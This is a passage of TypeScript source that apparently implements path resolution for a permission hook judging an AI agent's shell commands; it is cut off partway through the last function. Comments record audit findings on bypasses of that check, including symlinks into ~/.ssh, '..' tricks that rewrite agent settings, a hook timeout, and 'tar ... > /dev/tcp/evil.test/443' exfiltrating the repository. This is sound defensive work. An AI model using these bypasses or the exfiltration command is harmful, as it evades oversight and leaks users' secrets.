// THE ONE PATH RESOLVER OF THE SHELL LAYER.
//
// A shell word becomes a path in about forty places in the evaluator: a redirection target, the destination of a
// writer, a `-C` directory, an archive's extraction root, the payload of `find -exec`, a git pathspec, the value of an
// output option, the file a script reader opens. Each of them used to join the working directory and the word with
// `resolve(cwd, word)` and judge the result. `resolve` applies `..` to the TEXT, and the shell does not: the kernel
// resolves `d/../x` by following `d` first, so with `d -> .claude/sub` the file is `.claude/x`, and `resolve` said
// `x`. `echo x > d/../settings.json` was ALLOW while `cd d && echo x > ../settings.json` — the same file — was DENY,
// and the structured tools (Write, Edit, apply_patch) already judged it correctly. Two readers of one question
// drifted, which is the defect this repository has met most often.
//
// So the question is asked in exactly one place. `pathCandidates(cwds, word)` answers WHAT PATHS MAY THIS WORD DENOTE,
// and a caller judges every one of them and keeps the worst:
//
//   - the LEXICAL reading, `..` applied to the text. It stays because a protected NAME is a property of the typed
//     path (a `.git` that is itself a link has a realpath that no longer says `.git`), and because a lexical reading
//     can only make the verdict stricter, never weaker;
//   - the PHYSICAL reading, every component followed as the kernel follows it, `..` the parent of the directory
//     REACHED. A link whose target is missing is still followed (the nearest existing ancestor decides), a loop or
//     a chain of links is cut by a budget the whole resolution shares;
//   - each of them for the word as written AND for it trimmed, because a quoted word keeps its padding and a tool
//     that trims it opens another file (`" /etc/cron.d/x"`);
//   - each of them in EVERY directory the shell may be in (the working directory is a set, see cwdTimeline);
//   - after the word's own expansion: `~`, `~+`, `~-`, `~user`, `$HOME`, `${HOME}`, `$PWD`, `$OLDPWD`, a one-character
//     bracket class — the expansions the shell performs before it opens anything.
//
// WHAT THIS MODULE DOES NOT DO is judge: it knows nothing of capabilities. It also never throws and never walks more
// than it must — a word with no `..` has no physical reading of its own (the classifier canonicalises the lexical one),
// so ordinary work pays for no filesystem call it did not already make.
import { homedir, tmpdir, userInfo } from 'node:os';
import { lstatSync, readFileSync, readdirSync, readlinkSync, realpathSync, statSync } from 'node:fs';
import { basename, dirname, isAbsolute, join, resolve, sep } from 'node:path';
import { chargeWork } from './work-bound.ts';

/** How many links one path resolution may follow before it is read as a loop (Linux stops at 40). */
export const MAX_LINK_HOPS = 40;

/* ------------------------------------------------------------------------------------------------------------- *
 * One evaluation, one view of the filesystem
 * ------------------------------------------------------------------------------------------------------------- */

/** The kernel only READS the disk while it decides, and a decision is made in milliseconds: what `realpath` said at its
 *  first question is what it will say at the thirtieth. The cache lives for one evaluation (`withPathCache`) and is
 *  gone when the call returns, so a link that appears between two calls is seen by the second. */
let cache: Map<string, string> | null = null;
/** the directories a wildcard was expanded over, listed once per evaluation: the same directory is asked about again by every word that
 *  names it, and by every reading of every word (as written and trimmed, lexical and physical, in each directory the shell may be in) */
let listings: Map<string, Array<{ name: string; directory: boolean; link: boolean }> | null> | null = null;
/** what a reader computed ONCE from the disk for this evaluation and keeps (see `memoPerEvaluation`) */
let memo: Map<string, unknown> | null = null;

/**
 * Runs `body` against a FRESH view of the filesystem and puts the decision's own view back afterwards. A value that is remembered across
 * decisions (`DecisionMemo`) is priced by what computing it cost, and that must be what it costs ALONE: computed in the middle of a
 * decision whose view already held half of its walks, it cost thirty units less, and the price of the memo - and so the units of every
 * later decision that uses it - depended on which command happened to compute it first (RB-7).
 */
export function isolatedPathView<T>(body: () => T): T {
  if (cache === null) return body();
  // (the values a reader remembered for this evaluation are part of the view: a memoised value computed in here is computed against the fresh
  // view and paid for by it, and one the outer evaluation computed first is not handed over for nothing)
  const outer = { cache, listings, memo };
  cache = new Map();
  listings = new Map();
  memo = new Map();
  try {
    return body();
  } finally {
    cache = outer.cache;
    listings = outer.listings;
    memo = outer.memo;
  }
}

/** A value read from the disk that does not change while one decision is made (where a protected name really leads), computed on the first
 *  question and kept until the evaluation ends. Outside an evaluation nothing is kept: a unit test of one reader sees the disk as it is. */
export function memoPerEvaluation<T>(key: string, compute: () => T): T {
  if (memo === null) return compute();
  if (memo.has(key)) return memo.get(key) as T;
  const value = compute();
  memo.set(key, value);
  return value;
}

/** where the MACHINE keeps things the command did not name (HOME, the temporary directory) and where the HOST put the command (the
 *  working directory, the workspace roots, EGO_HOME), as written and as the disk resolves them. Fixed for one evaluation. */
let machineDirs: string[] = [];

export function withPathCache<T>(body: () => T, registered: ReadonlyArray<string | undefined> = []): T {
  if (cache !== null) return body(); // nested: the outer evaluation owns it
  cache = new Map();
  listings = new Map();
  memo = new Map();
  machineDirs = machineDirectories(registered);
  try {
    return body();
  } finally {
    cache = null;
    listings = null;
    memo = null;
    machineDirs = [];
  }
}

function machineDirectories(registered: ReadonlyArray<string | undefined>): string[] {
  const out = new Set<string>();
  for (const d of [homedir(), process.env['HOME'], tmpdir(), process.env['TMPDIR'], ...registered]) {
    if (!d) continue;
    const abs = resolve(d);
    out.add(abs);
    try {
      out.add(realpathSync(abs));
    } catch {
      /* a HOME that is not there is still where the machine keeps it */
    }
  }
  return [...out];
}

/**
 * THE PART OF AN ABSOLUTE PATH THAT THE COMMAND IS RESPONSIBLE FOR. Work is priced in text and in path components, and a path includes
 * where the machine keeps HOME and its temporary files and where the checkout sits: the same command cost thirty more units when HOME
 * was a directory that did not exist, and a different number in a checkout one directory deeper (closure audit 2026-10-02, RB-7). The
 * longest directory the machine or the host registered as its own - HOME, the temporary directory, the working directory, the
 * workspace roots, EGO_HOME - is taken off the front; what is left is what the command named. `registered` is the host's part.
 */
export function commandPart(abs: string, registered: ReadonlyArray<string | undefined> = []): string {
  let off = 0;
  for (const d of [...machineDirs, ...registered]) {
    if (!d || d === sep) continue;
    const r = d.endsWith(sep) ? d.slice(0, -1) : d;
    if ((abs === r || abs.startsWith(r + sep)) && r.length > off) off = r.length;
  }
  return abs.slice(off);
}

export const commandLength = (abs: string, registered: ReadonlyArray<string | undefined> = []): number => commandPart(abs, registered).length;

/** Is this path one of the directories the MACHINE (HOME, the temporary directory) or the HOST (the working directory, the workspace roots, EGO_HOME)
 *  keeps for itself? Whether such a directory exists is the machine's, and what a decision spends must not depend on it (RB-7). */
export const isMachineDirectory = (abs: string): boolean => machineDirs.includes(abs.length > 1 && abs.endsWith(sep) ? abs.slice(0, -1) : abs);

/** The number of components a walk to `path` takes: the price of the walk is the TEXT it follows, not what the disk happens to hold
 *  (a missing level took one more step than an existing one, so the units a decision spent depended on the machine it ran on). */
const componentsOf = (path: string): number => path.split('/').filter((p) => p !== '' && p !== '.').length;

/**
 * Canonical absolute path: symlinks resolved on the deepest existing ancestor so a not-yet-created file compares
 * correctly.
 *
 * A LINK WHOSE TARGET DOES NOT EXIST YET IS STILL A LINK. `realpath` fails on `lnk -> ~/.ssh/zz-new` exactly as it
 * fails on a file that was never created, and the fallback below then judged the link's own name — `<workspace>/lnk`,
 * an ordinary repository path — while `open(O_CREAT)` follows the link and creates `~/.ssh/zz-new`. So `Write`,
 * `apply_patch` and a shell redirection through such a link were `fs.repo.write` ALLOW for a credential store (audit
 * 2026-10-01, C3). A link shipped inside a cloned repository is enough; nothing has to make it in-session. The
 * name is therefore followed the way the kernel follows it: read the link, resolve what it names (itself possibly
 * missing, possibly another link) and judge the nearest existing ancestor of the destination.
 *
 * The text is normalised first (`resolve`), so a `..` in `p` is applied to the TEXT: this is the realpath of a path
 * that is already a path. A SHELL WORD goes through `pathCandidates`, which applies `..` the way the kernel does.
 */
export function canonicalPath(p: string): string {
  const abs = resolve(p);
  // A PATH LONGER THAN THE KERNEL OPENS IS NOT WALKED. `open` answers ENAMETOOLONG for it, so there is no file for the walk to
  // find, and the walk below recurses once per component and asks the disk at each: a twenty-thousand-component word took
  // seconds and blew the stack - an exception in the hook is a refusal, but a hook that outlives its host's patience is not
  if (abs.length > PATH_MAX) return abs;
  // The walk is paid for here, by the components of the path it follows, ONCE per path per decision: it asks the disk once per level it
  // finds missing, and the number of levels that are missing is the machine's, not the command's. (Whether a path is already in the
  // cache is not the question: a walk that ends in a missing HOME has put every level above it in the cache as a by-product, and the
  // next path above it was free on that machine and not on another.)
  const paid = `\0walked\0${abs}`;
  if (cache !== null && !cache.has(paid)) {
    cache.set(paid, '1');
    chargeWork(WALK_STEP_COST * (1 + componentsOf(commandPart(abs))));
  }
  const known = cache?.get(abs);
  if (known !== undefined) return known;
  const out = canonicalWalk(abs, { left: MAX_LINK_HOPS });
  cache?.set(abs, out);
  // (and what the walk found is a path that has been walked: asking about the canonical form of a path again is not a second path of the command -
  // on a machine whose HOME sits behind a link it was one more walk than on a machine whose HOME does not, which is the machine's - RB-7)
  if (cache !== null) cache.set(`\0walked\0${out}`, '1');
  return out;
}

/** `budget` is shared by the whole resolution, as the kernel's own limit is: a farm of links cannot make it exponential.
 *
 *  EVERY LEVEL OF THE WALK IS REMEMBERED, not only the path it was asked about (closure audit 2026-10-01, wave 3, "time"). A
 *  name that does not exist is walked up to its nearest existing ancestor, one failed `realpath` and one failed `readlink`
 *  per level, and a command that moves into a directory that is not there three hundred times (`cd a; cd a; …`) asks about
 *  paths that are each one level deeper than the last: the answer for the parent was already known, and asking again made
 *  the whole command quadratic in syscalls (ten seconds for two thousand `cd`). An answer is kept only when the walk
 *  followed no link, because a link spends the shared budget and the answer then depends on how much was left. */
function canonicalWalk(abs: string, budget: { left: number }): string {
  const known = cache?.get(abs);
  if (known !== undefined) return known;
  const before = budget.left;
  const out = canonicalWalkUncached(abs, budget);
  if (budget.left === before) cache?.set(abs, out);
  return out;
}

function canonicalWalkUncached(abs: string, budget: { left: number }): string {
  try {
    return realpathSync(abs);
  } catch {
    const parent = dirname(abs);
    if (parent === abs) return abs;
    // `basename`, not a slice past the parent's length: for a missing top-level name (`/zz`) the parent is `/`, one
    // character long, and the slice dropped the name
    const here = join(canonicalWalk(parent, budget), basename(abs));
    let target: string;
    try {
      target = readlinkSync(here);
    } catch {
      return here; // not a link (or nothing there at all): the name is the answer
    }
    // a loop, or a chain longer than the kernel would follow, cannot be opened at all; its own name is as good an answer
    if (budget.left-- <= 0) return here;
    return walkComponents(isAbsolute(target) ? sep : dirname(here), target, budget);
  }
}

/** a disk question asked while deciding is paid for in the same units as text scanned (work-bound.ts): a few syscalls */
const WALK_STEP_COST = 30;
/** reading one word as a path: the fixed part of the work, before the text of the word and the directories are counted */
const PATH_READ_COST = 200;

/**
 * Walks `path` one component at a time from `from`, the way the kernel resolves it: a symlink is followed where it
 * stands (existing or not), and `..` is the parent of the DIRECTORY REACHED, not of the text before it. The text
 * form `resolve()` computes is only right when no component is a link, and `d/../x` with `d -> /elsewhere/deep`
 * names `/elsewhere/x`, not `x` beside `d`.
 */
function walkComponents(from: string, path: string, budget: { left: number }): string {
  chargeWork(WALK_STEP_COST * componentsOf(path));
  let cur = from;
  for (const part of path.split('/')) {
    if (part === '' || part === '.') continue;
    // `cur` is always canonical here, so the parent of the directory REACHED is just its dirname
    cur = part === '..' ? dirname(cur) : canonicalWalk(join(cur, part), budget);
  }
  return cur;
}

const hasDotDot = (p: string): boolean => /(^|\/)\.\.(\/|$)/.test(p);

/** The longest path the kernel will open (Linux 4096; macOS is 1024). */
const PATH_MAX = 4096;

/** The physical reading of `literal` from `base` (the root for an absolute word). A decision reads the same word at several
 *  sites - the redirection, the ledger, the trust-store check - and a walk costs a filesystem call per component, so it is
 *  made once per evaluation. A walk starts with a fresh link budget, so its answer does not depend on who asked first. */
function physicalReading(base: string | null, literal: string): string {
  const key = `\0physical\0${base ?? ''}\0${literal}`;
  const known = cache?.get(key);
  if (known !== undefined) return known;
  const out = walkComponents(base === null ? sep : canonicalPath(base), literal, { left: MAX_LINK_HOPS });
  cache?.set(key, out);
  return out;
}

/** Where a path that may contain `..` lands once every link it passes through is followed (see walkComponents). */
export function physicalPath(p: string, cwd: string): string {
  const budget = { left: MAX_LINK_HOPS };
  return isAbsolute(p) ? walkComponents(sep, p, budget) : walkComponents(canonicalPath(cwd), p, budget);
}

/** An absolute path that is NOT a shell word — a registered repository root, a value read from a configuration file —
 *  normalised as text. A word typed on a command line goes through `pathCandidates`, never through here. */
export function lexicalPath(absolute: string): string {
  return resolve(absolute);
}

/* ------------------------------------------------------------------------------------------------------------- *
 * Padding
 * ------------------------------------------------------------------------------------------------------------- */

/** What a host's own string handling treats as padding: `\s`, plus NEXT LINE and MONGOLIAN VOWEL SEPARATOR (the
 *  Unicode White_Space of Rust's `trim` and of older tables, which JavaScript's `\s` does not cover). */
const HOST_PADDING = /[\s\u0085\u180e]/;
/**
 * `trim` with the padding set above. A LOOP, NOT `replace(/^\s+|\s+$/g, '')`: the trailing alternative is quadratic on a
 * long run of spaces that is NOT at the end (`/\s+$/` restarts at every space), and a patch line of 200 000 spaces and an
 * `x` would hold the hook for minutes - a hook that times out is a non-blocking error on the host, so the call it was
 * judging would simply run.
 */
export function hostTrim(s: string): string {
  let a = 0;
  let b = s.length;
  while (a < b && HOST_PADDING.test(s[a]!)) a++;
  while (b > a && HOST_PADDING.test(s[b - 1]!)) b--;
  return s.slice(a, b);
}

/* ------------------------------------------------------------------------------------------------------------- *
 * Devices and descriptor aliases
 * ------------------------------------------------------------------------------------------------------------- */

/** `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` ARE NOT FILES. bash intercepts the pathname inside its own
 *  redirection code and calls connect(2); nothing is opened on disk, and `ls /dev/tcp` is ENOENT. */
const NET_DEVICE_RE = /^\/dev\/(tcp|udp)\/([^/]+)\/([^/]+)$/;

/**
 * THE DEVICES THAT SWALLOW WHAT THEY ARE GIVEN OR PRODUCE WHAT THEY ARE ASKED FOR, and nothing else.
 *
 * One reader, for a redirection (`> /dev/null`) and for an option-valued destination (`curl -o /dev/null`) alike. They
 * used to be two: the redirection dropped every path under `/dev` before it was judged (so `echo x > /dev/disk0`
 * wrote a raw disk at ALLOW, and so would `/dev/mem`), while an option's value was judged as a file outside the
 * workspace — which made the health check `curl -s -o /dev/null -w '%{http_code}' URL` an absolute DENY. A discard
 * device is decided by NAME, from this list, after the path is resolved (`/dev/../etc/x` is `/etc/x`).
 *
 *   /dev/null, /dev/zero, /dev/full   data sinks and sources with no state
 *   /dev/random, /dev/urandom         read for bytes; a write only mixes entropy
 *   /dev/stdin, /dev/stdout, /dev/stderr, /dev/fd/0, /dev/fd/1, /dev/fd/2
 *                                     the command's OWN standard streams: whatever file they are was judged where the
 *                                     stream was opened (`> out.log`), and naming them again opens nothing new
 *   /dev/tty                          the controlling terminal. It is output to the human who is watching, or fails
 *                                     when there is no terminal; it is a file nowhere. A stricter answer would ask on
 *                                     `exec < /dev/tty`, which every husky hook runs to read a prompt.
 *
 * NOT here, deliberately: `/dev/fd/N` for N >= 3 (and the `/proc/<pid>/fd` links they are) is whatever descriptor an
 * earlier `exec 3>file`, or the parent process, left open — a destination nobody named on this line, so it asks
 * (`descriptorAlias`). Neither is a raw device (`/dev/disk0`, `/dev/sda`, `/dev/mem`, `/dev/kmem`), another
 * terminal (`/dev/pts/3`) or the console: those are destinations, and they are judged as the paths they are.
 */
const DISCARD_DEVICES: ReadonlySet<string> = new Set([
  '/dev/null',
  '/dev/zero',
  '/dev/full',
  '/dev/random',
  '/dev/urandom',
  '/dev/stdin',
  '/dev/stdout',
  '/dev/stderr',
  '/dev/tty',
  '/dev/fd/0',
  '/dev/fd/1',
  '/dev/fd/2',
  '/proc/self/fd/0',
  '/proc/self/fd/1',
  '/proc/self/fd/2',
  '/proc/thread-self/fd/0',
  '/proc/thread-self/fd/1',
  '/proc/thread-self/fd/2',
]);

/** The names of the descriptor a command reads its standard input from. When a line opens a FILE for input (`< file`) these are that file, and
 *  not a stream: on Linux `open("/dev/stdin", O_WRONLY|O_TRUNC)` reopens the underlying inode with write access, so `echo x < .claude/settings.json
 *  > /dev/stdin` rewrites the file whose READ was allowed (PA-06). A name that is not one of these is not an alias of the input. */
const STDIN_ALIASES: ReadonlySet<string> = new Set(['/dev/stdin', '/dev/fd/0', '/proc/self/fd/0', '/proc/thread-self/fd/0']);

/** True when ONE ABSOLUTE PATH is the standard input under another name (see STDIN_ALIASES). */
export function isStdinAlias(path: string): boolean {
  return path.startsWith('/') && STDIN_ALIASES.has(resolve(path));
}

/** True when ONE ABSOLUTE PATH names a discard device. Resolves first: `/dev/../etc/passwd` is `/etc/passwd`. */
export function isDiscardDevice(path: string): boolean {
  if (!path.startsWith('/')) return false;
  return DISCARD_DEVICES.has(resolve(path));
}

/** True when an absolute path is `/dev/tcp/…` or `/dev/udp/…`: a socket bash opens itself, so it is not judged in the PATH
 *  channel (as a write outside the workspace, which would deny the ordinary `echo > /dev/tcp/localhost/8080`
 *  connectivity check) - the `net-redirect` marker carries it to the network capability, where `nc localhost 8080` already
 *  sits. It must not be mistaken for a discard either: `tar czf - . > /dev/tcp/evil.test/443` streamed the whole
 *  repository, `.git` and `.env` included, to an arbitrary host at ALLOW, with no network binary anywhere on the line
 *  (exit review 7). */
export function isNetworkDevice(path: string): boolean {
  return path.startsWith('/') && NET_DEVICE_RE.test(resolve(path));
}

/** The connection a `/dev/tcp/HOST/PORT` (or `/dev/udp/…`) path opens, or null when the path is not one. The path is the word
 *  the SHELL sees - quotes and escapes already removed - because bash intercepts the name inside its own redirection code,
 *  after quote removal: `/dev/"tcp"/evil.test/80` is `/dev/tcp/evil.test/80` (r11-200). */
export function networkDevice(path: string): { proto: string; host: string; port: string } | null {
  if (!path.startsWith('/')) return null;
  const m = NET_DEVICE_RE.exec(resolve(path));
  return m === null ? null : { proto: m[1]!, host: m[2]!, port: m[3]! };
}

/** True when an absolute path is `/dev` or lies under it, AFTER resolution (`/dev/..` is `/`, and a nine-character prefix
 *  test once turned `/dev/../Users/me/.zshrc` into an ALLOW for any path on the machine). A device NAME is not file
 *  content: listing `/dev` reads nothing, and a read of a device node is not a read of the workspace. This is the
 *  question for a READ; whether a WRITE is swallowed is `isDiscardDevice`. */
export function isDevPath(path: string): boolean {
  const a = path.startsWith('/') ? resolve(path) : path;
  return a === '/dev' || a.startsWith('/dev/');
}

/** A path that is an ALIAS for something a name does not say: the working directory (`/proc/self/cwd`), the root
 *  (`/proc/self/root`), another process's, or an open descriptor above 2 (`/dev/fd/3`, `/proc/self/fd/3`). The text
 *  is not where it leads, and where it leads is decided by the process that opens it. */
const PROC_ALIAS_RE = /^\/proc\/(self|thread-self|\d+)\/(cwd|root|fd(?:info)?)(\/.*)?$/;
const DEV_FD_RE = /^\/dev\/fd\/(\d+)(\/.*)?$/;

export function descriptorAlias(path: string): string | null {
  if (!path.startsWith('/')) return null;
  const a = resolve(path);
  const dev = DEV_FD_RE.exec(a);
  if (dev) return Number(dev[1]) <= 2 && dev[2] === undefined ? null : `${a} is an open descriptor, which this line does not name`;
  const proc = PROC_ALIAS_RE.exec(a);
  if (!proc) return null;
  if (proc[2] === 'cwd') return `${a} is the working directory of ${proc[1] === 'self' || proc[1] === 'thread-self' ? 'this process' : `process ${proc[1]}`} under another name`;
  if (proc[2] === 'root') return `${a} is the root directory of ${proc[1] === 'self' || proc[1] === 'thread-self' ? 'this process' : `process ${proc[1]}`} under another name`;
  // /proc/<pid>/fd/0..2 are the standard streams (see DISCARD_DEVICES); /proc/<pid>/fd and fd/N above 2 are not
  const fd = /^\/(\d+)$/.exec(proc[3] ?? '');
  if (fd && Number(fd[1]) <= 2 && (proc[1] === 'self' || proc[1] === 'thread-self')) return null;
  return `${a} is an open descriptor of ${proc[1] === 'self' || proc[1] === 'thread-self' ? 'this process' : `process ${proc[1]}`}, which this line does not name`;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * The word's own expansion
 * ------------------------------------------------------------------------------------------------------------- */

/** The login name of the user the command runs as, when the platform will say. */
function currentUser(): string | null {
  try {
    return userInfo().username;
  } catch {
    return null;
  }
}

/** Where another user's home directory may be. The platform's database is not read (a lookup is a process), so every
 *  place a home directory is conventionally found is a candidate, and the word asks (`uncertain`). */
function homesOf(name: string): string[] {
  const homes = new Set<string>([join(dirname(homedir()), name), `/home/${name}`, `/Users/${name}`]);
  if (name === 'root') {
    homes.add('/root');
    homes.add('/var/root');
  }
  return [...homes];
}

/**
 * The shell's expansion of the START of a word, which happens before anything is opened. Returns every text the word
 * may expand to, or null when it cannot be known (a variable, a command substitution, a directory-stack entry).
 *
 *   `~`, `$HOME`, `${HOME}`       the user's home — the whole variable name, so `$HOMEDIR` is another variable
 *   `~+`, `$PWD`, `${PWD}`        the working directory, in each directory the shell may be in
 *   `~-`, `$OLDPWD`, `${OLDPWD}`  the previous directory, where the command line has one (`old`)
 *   `~name`                       that user's home: every conventional place, and the word asks
 *   `[h]`                         a one-character bracket class IS that character: both shells open the real name
 *
 * A one-character class is collapsed here rather than left as a glob, because a glob only reaches ASK and this
 * spelling is not ambiguous at all: `.[h]arness/runtime/decisions/d1.json` names one path (exit review 10). A class
 * with more than one character, a range or a negation stays a glob and keeps its opacity.
 */
function expandStart(
  word: string,
  dirs: readonly string[],
  old: readonly string[] | undefined,
  note: { uncertain: string | null },
): string[] | null {
  const t = word.replace(/\[([^\]!^\\/-])\]/g, '$1');
  let m: RegExpExecArray | null;
  // (`$NAME` ends where the identifier does, so `$HOMEDIR` is another variable; `${NAME}` ends at its brace, so `${HOME}x`
  // IS the home directory followed by an `x`; a tilde-prefix ends at the first slash)
  if ((m = /^(?:(?:~\+|\$PWD)(?=\/|$)|\$\{PWD\})([\s\S]*)$/.exec(t))) return dirs.map((d) => d + m![1]);
  if ((m = /^(?:(?:~-|\$OLDPWD)(?=\/|$)|\$\{OLDPWD\})([\s\S]*)$/.exec(t)))
    return old !== undefined && old.length > 0 ? old.map((d) => d + m![1]) : null;
  if (/^~[+-]?\d/.test(t)) return null; // the directory stack: not tracked
  if ((m = /^(?:(?:~|\$HOME)(?=\/|$)|\$\{HOME\})([\s\S]*)$/.exec(t))) return [homedir() + m[1]];
  if ((m = /^~([A-Za-z0-9_.-]+)(?=\/|$)([\s\S]*)$/.exec(t))) {
    if (m[1] === currentUser()) return [homedir() + m[2]];
    note.uncertain ??= `~${m[1]} is another user's home directory, which this kernel does not look up`;
    return homesOf(m[1]!).map((h) => h + m![2]);
  }
  return [t];
}

/* ------------------------------------------------------------------------------------------------------------- *
 * pathCandidates
 * ------------------------------------------------------------------------------------------------------------- */

export interface PathCandidates {
  /** Every absolute path the word may denote. The LEXICAL readings are not canonicalised (the classifier matches the typed
   *  NAME as well as the resolved path); the PHYSICAL reading, which differs from the lexical one only when a `..` follows
   *  a link, is canonical. For a glob this is the literal prefix, as it has always been. */
  readonly paths: string[];
  /** The word has a part nobody can know (`$VAR`, a command substitution, `~-3`): nothing is said about where it lands. */
  readonly dynamic: boolean;
  readonly glob: boolean;
  /** The paths that are the word AS TYPED - `$PWD`, `*` and `{a,b}` taken for the names they would be if they were quoted, which is what a
   *  name is when it is. They are a subset of `paths`, and they name one file each: a caller that treats a glob as a set must not treat
   *  these as part of it. */
  readonly typed: ReadonlySet<string>;
  /** Why the word cannot be pinned down although its text is known — a `/proc/self/cwd` alias, an open descriptor, another
   *  user's home. The caller asks: the readings above are a lower bound. */
  readonly uncertain: string | null;
}

/** One spelling of a word, read in every directory: the lexical readings, and the physical ones that differ from them. */
interface Reading {
  lexical: string[];
  physical: string[];
  glob: boolean;
  /** the lexical and physical readings of the word as typed (see `PathCandidates.typed`) */
  typed: string[];
}

function readVariant(
  variant: string,
  dirs: readonly string[],
  old: readonly string[] | undefined,
  note: { uncertain: string | null },
  whole = false,
  literalText = false,
): Reading | null {
  const texts = literalText ? [variant] : expandStart(variant, dirs, old, note);
  // a part the shell fills in at run time: one reading that cannot be named makes the word unnameable
  if (texts === null || (!literalText && texts.some((x) => /[$`]/.test(x)))) return null;
  const out: Reading = { lexical: [], physical: [], glob: false, typed: [] };
  // THE WORD AS TYPED IS A READING OF ITSELF. `~`, `$PWD`, `*`, `[x]` and `{a,b}` are expanded here as the shell expands them, but only
  // when they are not quoted, and a path reader holds the VALUE of a word: `touch '$PWD/pre-commit'` and `touch $PWD/pre-commit` reach it
  // as the same text. A link called `$PWD` (or `~+`, or `{a,b}`) that leads into .git/hooks was therefore never opened by the kernel and
  // always by the shell (PA-03). The name as typed is one more path the word may denote, and a reading can only make the verdict stricter.
  // (the expanded texts first; the word as typed only where it is not already one of them, and not under `whole`, which reads the text as it stands)
  const asTyped = !literalText && !whole && /[~$*?[{]/.test(variant);
  const readings: Array<{ text: string; typed: boolean }> = texts.map((text) => ({ text, typed: false }));
  if (asTyped && !(texts.length === 1 && texts[0] === variant && !/[*?[{]/.test(variant))) readings.push({ text: variant, typed: true });
  for (const { text, typed: isTyped } of readings) {
    const cut = literalText || isTyped ? -1 : text.search(/[*?[{]/);
    if (cut >= 0) out.glob = true;
    const literal = cut >= 0 && !whole ? text.slice(0, cut) : text;
    for (const base of isAbsolute(literal) ? [null] : dirs) {
      const lexical = base === null ? resolve(literal) : resolve(base, literal);
      out.lexical.push(lexical);
      if (isTyped) out.typed.push(lexical);
      // the physical reading differs only where a `..` can follow a link; a word without one is judged by the
      // lexical reading's canonical form, which is what the classifier makes of it
      // (a path longer than PATH_MAX cannot be opened at all - ENAMETOOLONG - so it has no physical reading to walk)
      if (hasDotDot(literal) && literal.length <= PATH_MAX) {
        const physical = physicalReading(base, literal);
        if (physical !== canonicalPath(lexical)) {
          out.physical.push(physical);
          if (isTyped) out.typed.push(physical);
        }
      }
      out.lexical.push(...aliasReadings(literal, lexical, dirs, note));
    }
  }
  return out;
}

/**
 * WHAT PATHS MAY THIS SHELL WORD DENOTE. See the head of this file. `cwds` is the set of directories the shell may be
 * in (a string is a set of one); `old` is the set `~-` and `$OLDPWD` may name, when the command line has one. A glob is
 * read by its literal prefix unless `whole` asks for the text as it stands (a protected pattern is matched against the
 * word the shell will expand, `control-plane/*.md`, and a prefix that ends in a slash matches nothing). `literal` reads the
 * text as a plain path with nothing expanded and no glob — the way a structured tool (Write, Edit, Read) is handed one.
 */
export function pathCandidates(
  cwds: string | readonly string[],
  word: string,
  old?: readonly string[],
  options: { whole?: boolean; literal?: boolean } = {},
): PathCandidates {
  const dirs = directoriesOf(cwds);
  // every word is read in every directory the shell may be in, as written and trimmed, lexically and physically: that product
  // is the cost, and it is paid before the reading (work-bound.ts)
  chargeWork(PATH_READ_COST + word.length * dirs.length);
  // the word as written, and as a tool that trims it would read it
  const trimmed = hostTrim(word);
  const note: { uncertain: string | null } = { uncertain: null };
  const paths = new Set<string>();
  const typed = new Set<string>();
  let glob = false;
  for (const variant of trimmed !== word && trimmed !== '' ? [word, trimmed] : [word]) {
    const r = readVariant(variant, dirs, old, note, options.whole === true, options.literal === true);
    if (r === null) {
      // a word with a part nobody can know is still, as typed, a name: `'a$b/pre-commit'` is a directory called `a$b` where `$b` is quoted, and
      // `$b` is unset where it is not - the typed reading is one more place it may be (it is judged beside the question the dynamic part asks)
      for (const base of isAbsolute(variant) ? [null] : dirs) typed.add(base === null ? resolve(variant) : resolve(base, variant));
      return { paths: [], dynamic: true, glob: false, typed, uncertain: null };
    }
    glob ||= r.glob;
    for (const p of [...r.lexical, ...r.physical]) paths.add(p);
    for (const p of r.typed) typed.add(p);
  }
  // (a path that is only the word AS TYPED, and that no expansion of it also reaches, is not part of what the word expands to)
  return { paths: [...paths], dynamic: false, glob, typed, uncertain: note.uncertain };
}

function directoriesOf(cwds: string | readonly string[]): string[] {
  const dirs = [...new Set(typeof cwds === 'string' ? [cwds] : cwds)].filter((d) => d !== '' && !d.startsWith('\0'));
  if (dirs.length === 0) dirs.push(process.cwd());
  return dirs;
}

/**
 * The places an alias path leads, as far as they can be told: `/proc/self/cwd/x` is `x` in the working directory. An alias is
 * recognised in the text BEFORE any `..` is applied as well: `/proc/self/cwd/../x` is beside the working directory, and
 * collapsing the `..` first turned it into `/proc/self/x`, which names nothing.
 */
function aliasReadings(
  literal: string,
  lexical: string,
  dirs: readonly string[],
  note: { uncertain: string | null },
): string[] {
  const probes: Array<{ at: string; tail: string }> = [{ at: lexical, tail: '' }];
  if (isAbsolute(literal) && hasDotDot(literal)) {
    const head = literal.split(/\/\.\.(?:\/|$)/)[0] || '/';
    probes.push({ at: resolve(head), tail: literal.slice(head.length) });
  }
  const out: string[] = [];
  for (const { at, tail } of probes) {
    const why = descriptorAlias(at);
    if (why === null) continue;
    note.uncertain ??= why;
    const m = PROC_ALIAS_RE.exec(at);
    if (!m || (m[1] !== 'self' && m[1] !== 'thread-self')) continue;
    const rest = '.' + (m[3] ?? '') + tail;
    if (m[2] === 'cwd') out.push(...dirs.map((d) => resolve(d, rest)));
    else if (m[2] === 'root') out.push(resolve(sep, rest));
  }
  return out;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * The readers that are not judges
 * ------------------------------------------------------------------------------------------------------------- */

/**
 * THE FILE A COMMAND OPENS, for the readers that open it themselves (a script, a makefile, a response file, a pathspec
 * list): the PHYSICAL path, because that is the file whose bytes will run. Reading the lexical reading of
 * `d/../Makefile` read a different file than the one `make -f d/../Makefile` executes. Null when the word is dynamic or a glob.
 * The word is NOT trimmed: this is the file the shell opens, not the one a lenient tool might.
 */
export function openedPath(cwd: string, word: string): string | null {
  const r = readVariant(word, directoriesOf(cwd), undefined, { uncertain: null });
  // a glob is a SET of files the shell expands; no reader opens "the file" it names
  if (r === null || r.glob || r.lexical.length === 0) return null;
  return r.physical[0] ?? canonicalPath(r.lexical[0]!);
}

/**
 * THE DIRECTORY A PROGRAM'S OWN `-C DIR` / `--chdir` LEAVES IT IN. The program calls chdir(2), which follows every link
 * and applies `..` to the directory REACHED, so a word with a `..` in it is judged by its physical reading; any other
 * word keeps the lexical spelling (the text the caller already compares), because the two name the same directory. Null
 * when the word is dynamic or a glob.
 */
export function chdirPath(base: string, word: string): string | null {
  const r = readVariant(word, directoriesOf(base), undefined, { uncertain: null });
  if (r === null || r.glob || r.lexical.length === 0) return null;
